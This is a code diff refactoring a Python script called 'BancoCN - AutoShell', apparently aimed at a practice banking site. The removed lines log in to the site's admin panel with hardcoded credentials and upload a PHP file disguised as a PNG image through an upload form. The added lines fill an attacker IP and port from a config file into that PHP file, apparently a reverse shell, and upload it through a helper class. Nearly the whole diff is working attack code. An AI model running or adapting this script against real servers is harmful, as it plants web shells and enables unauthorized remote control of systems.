@@ -1,39 +1,25 @@
-from requests import post, get
-import random, string
+from cn import Context
+from json import load
+from utils import randomString
 
 cnFile = "autoshell_base.php7"
 
-files = {
-    'image': (cnFile, open(cnFile, 'rb'), "image/png"),
-}
-
-def randomData(length):
-   letters = string.ascii_lowercase
-   return ''.join(random.choice(letters) for i in range(length))
-
-LOGIN_PAYLOAD = 'user=admin&password=senhafoda'
-
 print("** BancoCN - AutoShell")
-print(" * Resgatando SESSID")
 
-resp3 = get("http://www.bancocn.com/admin/login.php")
-COOKIES = resp3.cookies
+with open(cnFile, 'r') as input:
+   json = {}
+   with open("conf.json", 'r') as f:
+     json = load(f)
+   with open('autoshell.php7', 'w') as output:
+      output.write(input.read().replace("%as_ip%", json['ip_addr']).replace("%as_port%", str(json['port'])))
 
-
+ctx = Context()
 
 print(" * Autenticando SESSID")
-
-resp1 = post('http://www.bancocn.com/admin/index.php', data=LOGIN_PAYLOAD, allow_redirects=True, cookies=COOKIES, headers={
-   'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
-   'Content-Type': 'application/x-www-form-urlencoded'
-})
-
+ctx.authenticate()
 
 print(" * Fazendo Upload")
-resp2 = post('http://www.bancocn.com/admin/index.php', files=files, data={
-   'category': 1,
-   'Add': 'Add',
-   'title': randomData(8)
-}, cookies=COOKIES)
 
-print(resp2.text)
+ctx.upload(randomString(8), 'autoshell.php7', open('autoshell.php7'))
+
+
